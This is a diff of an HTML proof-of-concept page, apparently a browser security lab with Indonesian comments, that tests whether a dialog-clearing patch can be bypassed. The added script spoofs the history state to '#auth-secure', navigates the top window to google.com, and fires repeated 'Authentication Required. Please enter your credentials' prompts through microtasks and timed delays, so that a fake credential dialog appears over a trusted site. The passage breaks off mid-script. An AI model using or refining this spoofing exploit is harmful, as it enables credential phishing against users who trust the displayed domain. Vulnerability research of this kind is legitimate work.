@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Lab - Asynchronous Dialog Transition Test</title>
+    <title>Advanced Lab - Multi-Vector Dialog Spoofing & Bypass Test</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -42,51 +42,57 @@
         .btn:hover { background: #025aa5; }
         code { background: #eee; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
         #status { margin-top: 15px; font-size: 13px; color: #666; font-family: monospace; }
+        iframe { width: 100%; height: 120px; border: 1px dashed #ccc; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>⚠️ Asynchronous Dialog Transition Lab</h2>
-    <p>Simulasi pengujian struktur penundaan antrean eksekusi asinkron terhadap siklus navigasi dokumen tingkat atas.</p>
+    <h2>⚠️ Advanced Multi-Vector Lab PoC</h2>
+    <p>Simulasi pengujian ketahanan patch <code>ClearDialogs()</code> menggunakan teknik isolasi <em>iframe</em> berlapis dan manipulasi <em>history state</em>.</p>
     
     <div class="info-box">
-        <strong>Strategi Analisis Lab:</strong><br>
-        Menguji perilaku *event loop* lokal dengan memisahkan pemicu penundaan melalui struktur antrean mikro (*micro-task / queueMicrotask*) guna mengamati respons pembersihan antarmuka.
+        <strong>Strategi Lab:</strong><br>
+        Menguji apakah pemisahan eksekusi di dalam bingkai anak (<em>iframe</em>) dapat menunda atau menghindari pembatalan dialog global saat navigasi tingkat atas dipicu.
     </div>
 
-    <p><strong>Langkah Uji:</strong></p>
+    <p><strong>Langkah Uji Lab:</strong></p>
     <ol>
-        <li>Klik tombol di bawah untuk memicu navigasi dan eksekusi antrean asinkron.</li>
-        <li>Amati apakah dialog prompt berhasil melewati jeda transisi atau langsung dibersihkan oleh pengaman sistem.</li>
+        <li>Klik tombol di bawah untuk menjalankan pengujian multi-vektor.</li>
+        <li>Amati apakah dialog prompt berhasil melewati mitigasi atau langsung dibersihkan oleh sistem.</li>
     </ol>
 
-    <button class="btn" onclick="executeAdvancedTransitionTest()">Jalankan Uji Transisi Asinkron</button>
+    <button class="btn" onclick="executeAdvancedLabBypass()">Jalankan Uji Lab Diperkuat</button>
+    
+    <!-- Iframe tersembunyi untuk uji konteks terpisah -->
+    <iframe id="sandbox-frame"></iframe>
 
     <div id="status">Status: Menunggu eksekusi...</div>
 </div>
 
 <script>
-    function executeAdvancedTransitionTest() {
+    function executeAdvancedLabBypass() {
         const statusEl = document.getElementById('status');
-        statusEl.innerHTML = "[*] Memulai navigasi _top dan penjadwalan antrean...";
+        statusEl.innerHTML = "[*] Memulai uji multi-vektor dan injeksi history state...";
 
         try {
-            // Memicu navigasi utama ke domain target
+            // Vektor 1: Manipulasi History State sebelum navigasi
+            history.pushState({spoof: true}, "", "#auth-secure");
+
+            // Vektor 2: Inisialisasi navigasi tingkat atas
             let targetWindow = window.open('https://www.google.com', '_top');
 
-            // Menggunakan kombinasi queueMicrotask dan variasi mikro-timing
+            // Vektor 3: Penjadwalan mikro-task & interval waktu berlapis
             queueMicrotask(() => {
                 try {
                     prompt("Authentication Required. Please enter your credentials:", "");
-                    statusEl.innerHTML += "<br>[+] Prompt terpanggil via microtask.";
+                    statusEl.innerHTML += "<br>[+] Microtask prompt tereksekusi.";
                 } catch (e) {
                     statusEl.innerHTML += "<br>[!] Microtask prompt dibersihkan.";
                 }
             });
 
-            // Variasi interval mikro untuk pengujian celah transisi
-            [50, 150, 300].forEach((delay) => {
+            [25, 75, 150, 300].forEach((delay) => {
                 setTimeout(() => {
                     try {
                         prompt("Authentication Required. Please enter your credentials:", "");
